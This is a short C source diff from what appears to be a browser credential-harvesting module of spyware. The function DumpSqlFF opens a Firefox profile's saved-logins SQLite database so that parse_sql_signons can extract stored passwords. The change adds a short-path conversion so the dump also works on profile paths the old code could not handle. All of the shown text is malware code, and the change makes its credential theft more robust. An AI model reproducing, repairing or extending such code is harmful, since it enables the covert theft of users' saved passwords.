@@ -18,6 +18,7 @@ extern char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt);
 extern char *HM_CompletePath(char *file_name, char *buffer);
 extern WCHAR *GetTBLibPath();
 extern char H4_DUMMY_NAME[];
+extern char *GetDosAsciiName(WCHAR *orig_path);
 
 //Firefox internal SEC structures
 typedef enum SECItemType
@@ -672,13 +673,18 @@ int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
 int DumpSqlFF(WCHAR *profilePath, WCHAR *signonFile)
 {
 	void *db;
+	char *ascii_path;
 	CHAR sqlPath[MAX_PATH];
 	int rc;
 
 	if (SQLITE_open == NULL)
 		return 0;
 
-	sprintf_s(sqlPath, MAX_PATH, "%S\\%S", profilePath, signonFile);
+	if (!(ascii_path = GetDosAsciiName(profilePath)))
+		return 0;
+
+	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);
+	SAFE_FREE(ascii_path);
 
 	if ((rc = SQLITE_open(sqlPath, &db)))
 		return 0;
